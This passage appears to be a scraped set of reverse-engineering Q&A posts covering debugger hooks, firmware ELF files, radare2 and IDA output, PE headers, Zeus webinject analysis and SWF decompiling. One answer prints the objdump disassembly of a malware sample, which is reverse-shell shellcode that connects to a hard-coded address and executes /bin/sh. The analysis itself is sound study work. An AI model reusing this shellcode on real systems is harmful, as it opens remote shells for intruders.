functionToHook = ""msvcrt.strcpy""
functionAddress = imm.getAddress(functionToHook)
imm.log(str(functionAddress) + 'pf')
if fast:
    hook_list = fast.getAllLog()
    imm.log(str(hook_list))
    for a in hook_list:
        ret = showresult( imm, a, functionAddress )
    return""Logged: %d hook hits."" % len(hook_list)
imm.pause()
fast = FastLogHook(imm)
fast.logFunction(functionAddress)
fast.logBaseDisplacement('ESP', 0x4)
fast.logBaseDisplacement('ESP', 0x8)
fast.logRegister(""ESP"")
fast.Hook()
imm.addKnowledge(Name, fast, force_add = 1)

return ""Success!!""
</code></pre>

<p>I am running this code in Immunity Debugger but continuously getting error . I searched , googled but due to the limitation of documentation regarding this I am unable to correct it .</p>
","<p>I also just started to learn more about this topic and managed to write down the following lines of code.</p>

<p>I guess all my comments in the code are good enough as answer. I dont know much more then that anyway.</p>

<pre><code>  ' #!/usr/bin/env python

  import immlib
  import struct
  from immlib import STDCALLFastLogHook

  DESC=""FastLoogHook""

  def main(args):

        """"""
                Will hook and run its own assembly code then return to the process
                Usage: First run the script to install hook, then run it again to get results ^^
        """"""

        imm = immlib.Debugger()
        Name = ""hippie""


        # Get stored data on second script run
        fast = imm.getKnowledge(Name)

        if fast:

                # Get a list of all the things we saved
                hook_list = fast.getAllLog()

                # Log result
                imm.log(str(hook_list))

                # unpack list
                (func_addr, (esp1, esp2)) = hook_list[0]

                # Log argument
                imm.log(imm.readString(esp2))

                return ""Parsing results done""

        # Find strcpy address   
        strcpy = imm.getAddress(""msvcrt.strcpy"")

        # Building the hook
        fast = immlib.FastLogHook(imm)

        # This function is required and returns 
        # the address of the original instruction
        fast.logFunction(strcpy)

        # Offset
        fast.logBaseDisplacement(""ESP"", 4)
        fast.logBaseDisplacement(""ESP"", 8)

        # Set hook
        fast.Hook()

        # Save data for later use
        imm.addKnowledge(Name, fast, force_add = 1)

        return ""FastLogHook installed for strcpy""'
</code></pre>
","2504"
".bin files Firmware","590","","<p>I'm looking for help in analyzing a few .bin files. I have a program that installs a ""firmware"" update when I connect my camera through USB. </p>

<p>I'm on a Mac Os Sierra. Inside the Applications Folder under this Camera App/../../ I find a folder called Resources.</p>

<p>Actual files can be downloaded here: <a href=""https://i.stack.imgur.com/46jLg.jpg"" rel=""nofollow noreferrer"">.bin</a> (if you're interested)</p>

<p>I did a binwalk -e to extract the data from each .bin and the did a FILE command to understand a little more of what each individual is. Here are my results below:</p>

<p><a href=""https://i.stack.imgur.com/6tq5j.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/6tq5j.png"" alt=""enter image description here""></a></p>

<p>I highlighted files I thought were interesting or/and were linked or related. (Again I'm not too sure what the crap I'm doing) </p>

<p>I'd love to get some feedback on someone who better understands all of this. I'm trying to find the ""firmware"" and possibly decompile it and add a few things then put it all back together.</p>

<p>Thanks</p>

<hr>

<p>John Doe,</p>

<p>Again thanks. Here are some images of what I was able to get working on my PC laptop using CHIPSCOPE. Chipscope came with Xilinx WebPack, like I said above in my comment. I was able to connect to my Xilinx via JTAG ports but not much past that. I'll have to research further into how to utilize the microblazer tool chains... </p>

<p><a href=""https://i.stack.imgur.com/46jLg.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/46jLg.jpg"" alt=""enter image description here""></a></p>

<p>So should I bring over the .ELF files from my Mac and open them up with my SDK Tools? Or better question, where can I learn more about this process so I stop asking stupid questions? I'm not too familiar with how to use the Xilinxs SDK Tools and how to configure the FPGA with these microblazers .ELF files.</p>

<p><a href=""https://i.stack.imgur.com/HoUA3.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/HoUA3.jpg"" alt=""enter image description here""></a></p>

<p>Thanks again.</p>
","<p>Your camera has a Xilinx FPGA inside. FPGA design likely includes Microblaze soft CPU core. Files extracted by binwalk appear to be valid ELF files, so you'll just need to download Microblaze toolchain. The easiest way to do so is to download Vivado WebPack (it's free) and install it — you'll find a toolchain in the Xilinx SDK folder.</p>

<pre><code>$ microblazeel-xilinx-linux-gnu-readelf.exe -S 218CC2
There are 20 section headers, starting at offset 0x111554:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .vectors.sw_excep PROGBITS        00000008 0000b4 000008 00  AX  0   0  4
  [ 2] .vectors.interrup PROGBITS        00000010 0000bc 000008 00  AX  0   0  4
  [ 3] .vectors.hw_excep PROGBITS        00000020 0000c4 000008 00  AX  0   0  4
  [ 4] .text             PROGBITS        c20ca400 0000cc 0b7cd0 00 WAX  0   0 16
  [ 5] .init             PROGBITS        c21820d0 0b7d9c 000038 00  AX  0   0  4
  [ 6] .fini             PROGBITS        c2182108 0b7dd4 000020 00  AX  0   0  4
  [ 7] .rodata           PROGBITS        c2184000 0b7df4 012ca7 00  Ao  0 128684 8192
  [ 8] .sdata2           NOBITS          c21a36ac 0d76ac 000004 00  WA  0   0  1
  [ 9] .data             PROGBITS        c21a36b0 0caa9b 0461be 00 WAo  0 869620  4
  [10] .ctors            PROGBITS        c2277ba4 110c59 000004 00 WAo  0   8  4
  [11] .dtors            PROGBITS        c2277bac 110c5d 000004 00 WAo  0   8  4
  [12] .eh_frame         PROGBITS        c2277bb4 110c61 0007b5 00 WAo  0 2048  4
  [13] .jcr              PROGBITS        c22783b4 111416 000002 00 WAo  0   4  4
  [14] .gcc_except_table PROGBITS        c22783b8 111418 000080 00 WAo  0 140  4
  [15] .sdata            NOBITS          c2278444 1ac440 000004 00  WA  0   0  1
  [16] .bss              NOBITS          c2278448 1ac440 002244 00  WA  0   0  4
  [17] .stack            NOBITS          c227a690 1ac440 000c00 00  WA  0   0  1
  [18] .heap             NOBITS          c227b290 1ac440 1dd84d70 00  WA  0   0  1
  [19] .shstrtab         STRTAB          00000000 111498 0000ba 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
</code></pre>
","14211"
"Radare2 to show code hints like IDA Pro?","590","","<p>I am trying to disassemble a binary with radare2, as a free alternative to IDA. Here is how the IDA disassembly of that section looks like : </p>

<p>Here is what I am doing with Radare2 (with an additional option of <code>e asm.cmtright=true</code> in my <code>.radare2rc</code> file)
: </p>

<pre><code>  r2 binary 
    [0x004027c0]&gt; aaa
│          [0x004027c0]&gt; s 0x40baa4
│          [0x0040baa4]&gt; pd 10
│           0x0040baa4    4200053c     a1 |= loc.00420000
│           0x0040baa8    301ea524     a1 += 7728
│           0x0040baac    08c52426     a0 = s1 - 15096
│           0x0040bab0    09f82003     call t9
│           0x0040bab4    304c02ae     [s0 + 19504] = v0
│           0x0040bab8    1800bc8f     gp = [sp + 24]
│           0x0040babc    304c048e     a0 = [s0 + 19504]
│           0x0040bac0    2c83998f     t9 = [gp - 31956]
│           0x0040bac4    00000000     
│           0x0040bac8    09f82003     call t9
</code></pre>

<p>whereas the disassembly from the same location in IDA looks like : </p>

<pre><code>.text:0040BAA4                 la      $a1, aId         # ""id""
.text:0040BAAC                 addiu   $a0, $s1, (sub_40C508 - 0x410000)
.text:0040BAB0                 jalr    $t9 ; parse_uri
.text:0040BAB4                 sw      $v0, dword_434C30
.text:0040BAB8                 lw      $gp, 0x12B8+var_12A0($sp)
.text:0040BABC                 lw      $a0, dword_434C30
.text:0040BAC0                 la      $t9, sobj_get_string
.text:0040BAC4                 nop
.text:0040BAC8                 jalr    $t9 ; sobj_get_string
</code></pre>

<p>Is it possible to have radare2 show similar disassembly and be more meaningful? </p>

<p>Another example would be : </p>

<pre><code>[0x004127f8]&gt; pd 10
│           0x004127f8    6c83998f     t9 = [gp - 31892]
│           0x004127fc    00000000     
│           0x00412800    09f82003     call t9
│           0x00412804    2000a427     a0 = sp + 32
│           0x00412808    1800bc8f     gp = [sp + 24]
│           0x0041280c    02000524     a1 = 2
│           0x00412810    5481998f     t9 = [gp - 32428]
│           0x00412814    21300000     a2 = zero
│           0x00412818    09f82003     call t9
│           0x0041281c    2120c002     a0 = s6
</code></pre>

<p>compared to IDA : </p>

<pre><code>.text:004127F8                 la      $t9, system
.text:004127FC                 nop
.text:00412800                 jalr    $t9 ; system
.text:00412804                 addiu   $a0, $sp, 0x248+var_228  # command
.text:00412808                 lw      $gp, 0x248+var_230($sp)
.text:0041280C                 li      $a1, 2           # cmd
.text:00412810                 la      $t9, lockf
.text:00412814                 move    $a2, $zero       # len
.text:00412818                 jalr    $t9 ; lockf
.text:0041281C                 move    $a0, $s6         # fd
</code></pre>

<p>IDA even tells me that this is the address of system, while just looking at the radare2 code I wouldn't have had been able to find it. </p>

<p>Any suggestions on how I could improve the radare2 analysis or it is just one of the limitations ?</p>
","<p>you probably have e asm.esil set to true and e asm.emu set to false 
try toggling them</p>

<pre><code>radare2.exe malloc://0x4f0000
 -- Hello Mr. Anderson

[0x00000000]&gt; s 0x40abb4
[0x0040abb4]&gt; wx 4200053c301ea52408c5242609f82003
[0x0040abb4]&gt; e asm.emu = true
[0x0040abb4]&gt; e asm.esil = true
[0x0040abb4]&gt; e asm.arch = mips


[0x0040abb4]&gt; pd 4
            0x0040abb4      4200053c       0x420000,a1,=              ; a1=0x420000
            0x0040abb8      301ea524       7728,a1,+,a1,=             ; a1=0x421e30
            0x0040abbc      08c52426       15096,s1,-,a0,=            ; a0=0xffffffffffffc508 -&gt; 0xffffff00
            0x0040abc0      09f82003       0,$ds,&gt;,?{,$$,1,TRAP,BREAK,},pc,4,+,ra,=,t9,$jt,=,1,$ds,=; ra=0x40abc8 ; $jt=0x0 ; CALL: 0x0, 0x0
, 0x0, 0x0


[0x0040abb4]&gt; e asm.esil = false
[0x0040abb4]&gt; pd 4
            0x0040abb4      4200053c       lui a1, 0x42               ; a1=0x420000
            0x0040abb8      301ea524       addiu a1, a1, 0x1e30       ; a1=0x421e30
            0x0040abbc      08c52426       addiu a0, s1, -0x3af8      ; a0=0xffffffffffffc508 -&gt; 0xffffff00
            0x0040abc0      09f82003       jalr t9                    ; ra=0x40abc8 ; $jt=0x0 ; CALL: 0x0, 0x0, 0x0, 0x0
[0x0040abb4]&gt;
</code></pre>
","13164"
"How can I make IDA start the analysis at imagebase?","589","","<p>I noticed that despite the imagebase for win32 executables be 0x400000, Ida Pro only starts the analysis at 0x401000. What is before that and how can I change IDA's settings to start the analysis at the imagebase? Thank you.</p>
","<p>PE executables start with a header block that consists of a little DOS exe stub (with its own little header), a structure called <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms680336%28v=vs.85%29.aspx"" rel=""nofollow"">IMAGE_NT_HEADERS</a>, and a section table. A normal PE has no 32-bit/64-bit executable code there, so IDA doesn't load the header block unless you check ""<strong>manual load</strong>"".</p>

<p>Relevant resources:</p>

<ul>
<li>Microsoft's <a href=""https://msdn.microsoft.com/en-us/windows/hardware/gg463119.aspx"" rel=""nofollow"">PE COFF specification</a> (currently at version 8.3)</li>
<li>Matt Pietrek's classic <a href=""https://msdn.microsoft.com/en-us/library/ms809762.aspx"" rel=""nofollow"">Peering Inside the PE: A Tour of the Win32 Portable Executable File Format</a></li>
<li>its sequel <a href=""https://msdn.microsoft.com/en-us/magazine/cc301805.aspx"" rel=""nofollow"">An In-Depth Look into the Win32 Portable Executable File Format</a></li>
<li>ReversingLabs' <a href=""https://media.blackhat.com/bh-us-11/Vuksan/BH_US_11_VuksanPericin_PECOFF_WP.pdf"" rel=""nofollow"">Undocumented PECOFF</a></li>
</ul>
","8129"
"Which version of assembly does OllyDbg disassemble binary to?","587","","<p>So I understand that there are many assemblers such as MASM, FASM, NASM, etc.</p>

<p>But which version is the disassembler in OllyDbg and Cheat Engine?</p>
","<p>OllyDbg supports disassembling to MASM, IDEAL, and HLA:</p>

<p><img src=""https://i.stack.imgur.com/CDpKC.png"" alt=""Debugging options""></p>
","2506"
"Unable to dump malware assembly using objdump","586","","<p>I'm trying to dump assembly code of a ShellShock malware explained in this blog post:</p>

<ul>
<li><a href=""http://blog.malwaremustdie.org/2014/09/linux-elf-bash-0day-fun-has-only-just.html?m=1"" rel=""nofollow"">MMD-0027-2014 - Linux ELF bash 0day (shellshock): The fun has only just begun... </a>.</li>
</ul>

<p>After dumping using <code>objdump -d</code>, the output shows just the following:</p>

<pre><code>fu4k:     file format elf32-i386
</code></pre>

<p>Then, I tried the command <code>objdump -b elf32-i386 -d fu4k</code>, but it gave the same output. </p>

<p>Please point me in the right direction. Malware is located <a href=""http://www.kernelmode.info/forum/viewtopic.php?f=16&amp;t=3506"" rel=""nofollow"">here</a> (login required, password:infected).</p>
","<p><code>-d</code> only disassembles what objdump considers to be code sections. You can use <code>-D</code> to force disassembly of all sections. However, it still doesn't work for this file because it doesn't have a <em>section table</em>:</p>

<pre><code>fu4k:     file format elf32-i386
fu4k
architecture: i386, flags 0x00000102:
EXEC_P, D_PAGED
start address 0x08048054

Program Header:
    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
         filesz 0x00000098 memsz 0x000000dc flags rwx

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
SYMBOL TABLE:
no symbols
</code></pre>

<p>So, in this case you can ask objdump to treat the file as binary and disassemble everything:</p>

<pre><code>objdump -b binary -D -m i386 fu4k
</code></pre>

<p>To improve disassembly, you can use the information from the ELF headers (load address and entrypoint address):</p>

<pre><code>&gt;objdump -b binary -D -m i386 fu4k --adjust-vma=0x08048000 --start-address=0x08048054

fu4k:     file format binary


Disassembly of section .data:

08048054 &lt;.data+0x54&gt;:
 8048054:       31 db                   xor    %ebx,%ebx
 8048056:       f7 e3                   mul    %ebx
 8048058:       53                      push   %ebx
 8048059:       43                      inc    %ebx
 804805a:       53                      push   %ebx
 804805b:       6a 02                   push   $0x2
 804805d:       89 e1                   mov    %esp,%ecx
 804805f:       b0 66                   mov    $0x66,%al
 8048061:       cd 80                   int    $0x80
 8048063:       93                      xchg   %eax,%ebx
 8048064:       59                      pop    %ecx
 8048065:       b0 3f                   mov    $0x3f,%al
 8048067:       cd 80                   int    $0x80
 8048069:       49                      dec    %ecx
 804806a:       79 f9                   jns    0x8048065
 804806c:       68 1b 13 9f e0          push   $0xe09f131b
 8048071:       68 02 00 11 c1          push   $0xc1110002
 8048076:       89 e1                   mov    %esp,%ecx
 8048078:       b0 66                   mov    $0x66,%al
 804807a:       50                      push   %eax
 804807b:       51                      push   %ecx
 804807c:       53                      push   %ebx
 804807d:       b3 03                   mov    $0x3,%bl
 804807f:       89 e1                   mov    %esp,%ecx
 8048081:       cd 80                   int    $0x80
 8048083:       52                      push   %edx
 8048084:       68 2f 2f 73 68          push   $0x68732f2f
 8048089:       68 2f 62 69 6e          push   $0x6e69622f
 804808e:       89 e3                   mov    %esp,%ebx
 8048090:       52                      push   %edx
 8048091:       53                      push   %ebx
 8048092:       89 e1                   mov    %esp,%ecx
 8048094:       b0 0b                   mov    $0xb,%al
 8048096:       cd 80                   int    $0x80
</code></pre>
","6604"
"Why does IDA Pro's pseudocode function not produce for loops?","586","","<p>Question came up in a reverse engineering class.  The prof asked this question.  I mean, in the grand scheme of things, while loops == for loops, I don't have a problem with that.  </p>

<p>IDA Pro book... Google... not seeing anything online here.  </p>

<p>So why does IDA pro never produce for loops in its pseudocode generator?</p>
","<p>Just because you haven't seem them does not mean they don't exist. In my experience the decompiler produces <code>for</code> loops all the time.</p>

<p><strong>EDIT</strong>: Here's just one example:</p>

<pre><code> loc_804B520:
                 xor     edx, edx
                 jmp     short loc_804B52B

 loc_804B524:
                 mov     al, [edi+edx]
                 mov     [ebx+edx], al
                 inc     edx

 loc_804B52B:
                 cmp     edx, esi
                 jl      short loc_804B524
</code></pre>

<p>Output:</p>

<pre><code>  for ( i = 0; i &lt; a2; ++i )
    *(_BYTE *)(v2 + i) = *(_BYTE *)(a1 + i);
</code></pre>
","4002"
"Difference Between Binary Exploitation and Reverse Engineering?","584","","<p>I am a beginner in Reverse Engineering and am trying to improve my skill by participating in any CTF's I can and solving CrackMe's. I am trying to find out why Binary Exploitation and Reverse Engineering are always separated as two different topics.</p>

<p>My Question is simple:</p>

<blockquote>
  <p>Is Reversing different from Binary Exploitation?</p>
</blockquote>
","<p>Yes, it is different. Binary exploitation intended to change behaviour of the binary, and reverse engineering intended to understand how it works.</p>

<p>BInary exploitation requires some reverse engineering, reverse engineering doesn't necessarily requires binary exploitation.</p>

<p>The best example I know about it is overcoming DRM protections of media content.
It requires a lot of reverse engineering and almost not requires binary exploitation.</p>
","3551"
"Studying Zeus 2.X","583","","<p>I'm doing some study on Zeus 2.x, trying to wrap my head around how it works. By using <a href=""https://github.com/Visgean/Zeus"" rel=""nofollow"">this code</a>. I've built my own builder to work on my test environment.</p>

<p>Right know I want to do a very specific thing, which is extracting from memory the webinjects configuration. The first experiments I did was to attach to IExplorer and monitor calls to functions I know Zeus hooks, like <code>HttpSendRequest*</code>. I was expecting that at some point while stepping through those executions I'd see the injections configuration loaded into memory. I've tried to automate the proccess setting a breakpoint upon call of this function and using OllyDbg's Memory Watch plugin, which dumps every string it encounters.</p>

<blockquote>
  <p>So now I want to pinpoint and understand exactly where should I look to see this decrypted configuration in memory.</p>
</blockquote>

<p>My assumptions so far:</p>

<ul>
<li>I'm unable to see anything strange because the <code>HttpSendRequestX</code> function I'm setting a breakpoint is actually the original, unchanged from Wininet;</li>
<li>Dumping memory of the machine and analysing it offline is not enough, since the structure which holds the webinjects (BinStorage) is loaded in memory when it's needed and then discarded (free'd) </li>
</ul>

<p>At this point I was thinking to monitor calls to <code>VirtualAlloc</code> and place a breakpoint on memory write on those newly allocated areas (at some point Zeus is bound to place there the encrypted configuration and then decrypt it).</p>

<p>But this is still a long shot. Any ideas? Also I'm doing most of this work by attaching on <code>IExplore.exe</code>, should I do it on <code>explorer.exe</code> instead?</p>

<p>Any tips are appreciated !</p>
","<p>Answering my own question for further reference:</p>

<p>Zeus and many other MiTB capable trojans use API hooking as preferred method to inject malicious code in the webpages before they are rendered by the victim. API hooking is sort of like doing a MiTM of a system call, whereby the bot intercepts the call, takes ownership and control, performs some malicious action and then returns control to the original function. Something like:</p>

<p>call <code>network_function</code>:</p>

<pre><code>JMP XYZ ----&gt; JMPs to malicious code 
..                |
..                |
...           &lt;---- returns to the original function
</code></pre>

<p>So, in this scenario, in order to extract the web injects, the best bet was to understand the logic of the trojan. That is, after a user opens a URL in the browser, this URL will be matched with a list containing the configuration of which URLs to inject. This will surely be performed on Wininet functions such as <code>HttpSendRequest</code>, <code>HttpOpenRequest</code>, etc. If we breakpoint on that function in the main process of <code>IExplore.exe</code> (in an infected machine) we'll see the first instruction to be that <code>JMP</code> instruction we've talked about. If we then proceed to step into, we'll access the actual instructions using the structure BinStorage and other, all related to Zeus. Since there is still a lot of code to go through and the interest was to retrieve the webinjects, one approach is to monitor for decryption / decode instructions (Zeus's configuration is stored encrypted; it only makes sense that if we monitor the instructions responsible for this operation will lead us to the actual decrypted content). </p>

<p>In this case searching for the sequence of bytes</p>

<pre><code> MOV ANY, ANY
 XOR ANY, ANY
 INC EAX
 DEC ESI
</code></pre>

<p>If we breakpoint after the last instruction and then inspect the contents of the memory address pointed by the destination operands in the <code>MOV</code>/<code>XOR</code> operations we will most likely find the decrypted payload (i.e. our dynamic configuration section).</p>
","8779"
"Why this IDC script can not find all the functions?","582","","<p>Test platform is Linux 32 bit, ELF file, GNU coreutils.</p>

<p>Basically I am trying dump all the functions using IDC script, here is part of my IDC script:</p>

<pre><code>for (addr = NextFunction(addr); addr != BADADDR; addr = NextFunction(addr)) {
    name = Name(addr);
    end = GetFunctionAttr(addr, FUNCATTR_END);
    locals = GetFunctionAttr(addr, FUNCATTR_FRSIZE);
    frame = GetFrame(addr);
    ret = GetMemberOffset(frame, "" r"");
    if (ret == -1) continue;
    firstArg = ret + 4;
    args = GetStrucSize(frame) - firstArg;

    dumpFunction(name, addr, end);
}
</code></pre>

<p>I am using it to test GNU coretuils, and I find some functions like </p>

<pre><code>            public qset_acl
            qset_acl        proc near

            jmp     chmod_or_fchmod
            qset_acl        endp
</code></pre>

<p>which can not be found by this script.</p>

<p>Am I doing something wrong? Could any one give me some help?</p>

<p>Thank you!</p>
","<p>The stack frame structure is not created unless necessary (i.e. the function accesses a stack argument or local variable), so these stub functions get skipped by your <code>(ret == -1)</code> check.</p>
","3761"
"How to find out why OllyDbg crashes?","580","","<p>I'm using OllyDbg v2.01 to analyse a specific binary. The binary is calling <em>createProcess()</em> and afterwards it's checking the return value via <em>test eax, eax</em>.
EAX contains 00000001 so the createProcess() call must have been successful. Nevertheless, OllyDbg crashes if I want to step over <em>test eax, eax</em> and I have absolutely no idea why. Is there any way to find out what's the problem for Olly? Normally, I can see if there is an access violation or something else going on which might bother Olly but in this case, there is nothing.</p>
","<p>You can debug OllyDbg with another instance of OllyDbg:</p>

<ul>
<li><p>In OllyDbg process #1, run OllyDbg process #2.</p></li>
<li><p>In OllyDbg process #2, run your target binary.</p></li>
<li><p>When OllyDbg process #2 crashes, you can analyze the crash via
OllyDbg process #1.</p></li>
</ul>
","9054"
"Obtaining MmNonPagedPoolStart on x64 systems","577","","<p>On a x64 Windows 7 I want to get the limits of non paged pool. I know that _KDDEBUGGER_DATA64 structure has this information (fields like MmNonPagedPoolStart and MmNonPagedPoolEnd). 
On x86 systems this structure was obtained from KPCR.KdVersionBlock, but looking with WinDbg at KPCR's on x64 systems, KdVersionBlock seems to always be null. </p>

<p>Is there a way of getting this structure? Or another way of getting what I want? Maybe I'm not looking in the right place. </p>
","<p><code>nt!KdDebuggerDatablock</code> used to be a public global symbol in NT</p>

<pre><code>lkd&gt; x/v nt!KdDebuggerDataBlock
pub global 80545b60             0 nt!KdDebuggerDataBlock = &lt;no type information&gt; 
</code></pre>

<p><code>dpS  nt!KdDebuggerDataBlock lxxxx</code> should fetch the <code>NonPagedPoolStart</code>  </p>

<pre><code>lkd&gt; !grep -i -c ""dpS nt!KdDebuggerDataBlock la5"" -e ""pool""
 8055b5a0 nt!ExpPagedPoolDescriptor
 8054ab2c nt!ExpNumberOfPagedPools
 nt!MmMaximumNonPagedPoolInBytes
 80553cb8 nt!MmNonPagedPoolStart
</code></pre>

<p>This should get the complete structure</p>

<pre><code>lkd&gt; .printf ""%ma\t%08x\n"" , nt!KdDebuggerDataBlock+10,poi(nt!KdDebuggerDataBlock+14)
KDBG    00000290
lkd&gt; .for (r $t0=0 ; @$t0 &lt;poi(nt!KdDebuggerDataBlock + 14) ; r $t0 = @$t0+4) { .printf ""%08x\t%08x\t%y\n"", (nt!KdDebuggerDataBlock + @$t0) ,poi(nt!KdDebuggerDataBlock + @$t0) ,poi(nt!KdDebuggerDataBlock + @$t0) }
</code></pre>
","6487"
"how do I debug full screen applications","576","","<p>I need to debug an old (1999) full screen application. When I window the application and attach olly the program crashes.</p>

<p>I have heard of remote debugging. Would running the program on a VM and then attaching windbg to the application on the remote machine do the trick?</p>
","<p>you can use windbg like an user-mode debugger from a kernel connection </p>

<p>open the vm<br>
install windbg in vm<br>
install the full screen game in vm   </p>

<p>connect the vm to a kernel debugger in host   </p>

<p>execute ntsd -d {the fullscreen app in vm}  </p>

<p>the kernel debugger in host will kick to life as a plain user-mode debugger debugging the app ( the syntax for continuing is kinda tricky refer windbg manual for syntax of using ntsd -d )</p>
","11167"
"Wapiflapi reverse engeneering exercices","575","","<p>Right now I'm trying to solve r5 from <a href=""https://github.com/wapiflapi/exrs"" rel=""nofollow"">here</a></p>

<p>I've already tried to understand pseudo-code from Hooper</p>

<pre><code>function check_password {
    var_28 = arg0;
    if (strlen(var_28) != strlen(""this_is_not_even_interesting_its_garbage"")) {
            rax = 0xffffffff;
    }
    else {
            strcpy(""this_is_not_even_interesting_its_garbage"", var_28);
            var_18 = 0x1;
            while (var_18 != 0x0) {
                    var_18 = 0x0;
                    for (var_14 = 0x0; var_14 &lt;= 0x27; var_14 = var_14 + 0x1) {
                            if ((*(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff) != 0x0) {
                                    rax = random();
                                    rcx = *(int8_t *)(sign_extend_64(var_14) + 0x6010a0) &amp; 0xff &amp; 0xff;
                                    temp_3 = rax % rcx;
                                    *(int8_t *)(sign_extend_32(var_14) + 0x6010a0) = (*(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff) - temp_3 + 0x1;
                                    var_18 = var_18 | *(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff &amp; 0xff;
                                    *(int8_t *)(sign_extend_32(var_14) + ""this_is_not_even_interesting_its_garbage"") = (*(int8_t *)(sign_extend_32(var_14) + ""this_is_not_even_interesting_its_garbage"") &amp; 0xff) - temp_3 + 0x1;
                            }
                    }
            }
            rax = *master;
            rax = strcmp(rax, ""this_is_not_even_interesting_its_garbage"");
    }
    return rax;
}
</code></pre>

<p>but it's too complicated for me right now. So I know that the password length should be 40 but how does the other part of the code work?</p>

<p>The unclear parts are the <code>unt8_t</code> casts. I've used gdb to step through the code, and I saw the results of certain instructions but cannot understand why these are the results ?</p>
","<p>Although OP clarified only the inner <code>for</code> is unreadable to him, I'll write an answer that thoroughly explains the first few lines and then abruptly stops at the most crucial part of the inner for loop. While believing examples are a great way to learn, I do that to make this as educational as possible, without interfering with the learning process of independently solving exercises. I am also unfamiliar with the specific set of exercises and would like to avoid providing full answers where those were not intended by the creator.</p>

<p>I hope i hit that sweet spot of being educational enough yet not too much.</p>

<p>Good luck with the exercise, here goes:</p>

<p><code>var_18 = 0x1;</code></p>

<p>Set an internal state to 1.</p>

<p><code>while (var_18 != 0x0) {</code></p>

<p>While state is <code>True</code>, continue executing loop's content. The state is actually a boolean indicating processing is not finished yet.</p>

<p><code>var_18 = 0x0;</code></p>

<p>Set internal state to zero at every outer loop iteration. This means every iteration must set the ""not finished yet"" flag.</p>

<p><code>for (var_14 = 0x0; var_14 &lt;= 0x27; var_14 = var_14 + 0x1) {</code></p>

<p>Inner for iterates 0x28 times, 40 in decimal. Since we know this is the length of the entire string, we can assume the inner loop somehow iterates over all characters of the string. This might be a coincidence, but we should keep an eye for it.</p>

<p><code>if ((*(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff) != 0x0) {</code></p>

<p>Now here it gets a little bit more complicated, so we'll split it to several parts:</p>

<p><code>sign_extend_32(var_14)</code></p>

<p>Since we know var_14 is a non negative integer between 0 and 39 (including), there's no meaning to sign-extending it. Sign-extending is basically the operation of converting a shorter length value to longer, taking the sign bit into account. See <a href=""https://en.wikipedia.org/wiki/Sign_extension"" rel=""nofollow"">this</a> for more info about sign-extension. This is either a compiler or decompiler artifact. A more advanced decompiler might have removed this.</p>

<p><code>(int8_t *)(sign_extend_32(var_14) + 0x6010a0)</code></p>

<p>Add our <code>var_14</code> to a relatively long hex offset. By the looks of it, it's probably an offset to table of 40 bytes. This is learnt from experience, taking a look at value at that address might clear it up. Adding <code>var_14</code> and then casting to an int8 pointer further suggests that's the case, using <code>var_14</code> as the index in that table.</p>

<p><code>(*(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff)</code></p>

<p>If we weren't convinced yet, by now it's pretty clear as we read a byte from the resulting offset. AND-ing it with 0xff is yet another decompiler artifact, caused by how a compiler will read a byte in 64bit intel processors.</p>

<p><code>if ((*(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff) != 0x0) {</code></p>

<p>back to the full line, this is reading the byte from the table, and skipping the current iteraction of the inner loop.</p>

<p><code>rax = random();</code></p>

<p>Simple. Set a random value into <code>rax</code>.</p>

<p><code>rcx = *(int8_t *)(sign_extend_64(var_14) + 0x6010a0) &amp; 0xff &amp; 0xff;</code></p>

<p>This is actually quite identical to the condition from before, only now the value of that index in the table is stored into <code>rcx</code>.</p>

<h2>remaining lines of code</h2>

<pre><code>                                temp_3 = rax % rcx;
                                *(int8_t *)(sign_extend_32(var_14) + 0x6010a0) = (*(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff) - temp_3 + 0x1;
                                var_18 = var_18 | *(int8_t *)(sign_extend_32(var_14) + 0x6010a0) &amp; 0xff &amp; 0xff;
                                *(int8_t *)(sign_extend_32(var_14) + ""this_is_not_even_interesting_its_garbage"") = (*(int8_t *)(sign_extend_32(var_14) + ""this_is_not_even_interesting_its_garbage"") &amp; 0xff) - temp_3 + 0x1;
                        }
                }
        }
        rax = *master;
        rax = strcmp(rax, ""this_is_not_even_interesting_its_garbage"");
}
return rax;
</code></pre>
","13310"
"How to get resource in swf file?","574","","<p>I use this site <a href=""http://www.showmycode.com/"" rel=""nofollow"">http://www.showmycode.com/</a> to decompile the swf below
<a href=""http://kwcdn.000dn.com/swfs/8b/23440heisesm/bg.swf"" rel=""nofollow"">http://kwcdn.000dn.com/swfs/8b/23440heisesm/bg.swf</a></p>

<p>But the code only shows the link for a video but I can not get the image in the background. Where and how is that image is embedded in the swf? How can I retrieve that image?</p>

<p>Long story short, I want to search which game is it, from an ads in a Chinese site, but I can not read any Chinese, and the ads is a fake lead to a fake game. So the easiest way is to decompile the swf and use the image in google search hoping for some results. The decomplied code is shown below:</p>

<pre><code>function video_replay()
{
    my_ns.seek(0);
}
var str_url = ""http://kwflvcdn.000dn.com/swfs/17/23308hssm/hesm.flv"";
var my_nc = new netconnection();
my_nc.connect(null);
var my_ns = new netstream(my_nc);
my_ns.setbuffertime(0);
var my_video;
my_video.attachvideo(my_ns);
my_video.smoothing = true;
my_ns.play(str_url);
var m_iErrorCount = 0;
my_ns.onstatus = function (infoObject)
{
    if ((infoObject.level == ""error"") &amp;&amp; (m_iErrorCount &lt; 2))
    {
        m_iErrorCount++;
        var _local2 = setTimeout(video_replay, 3);
    }
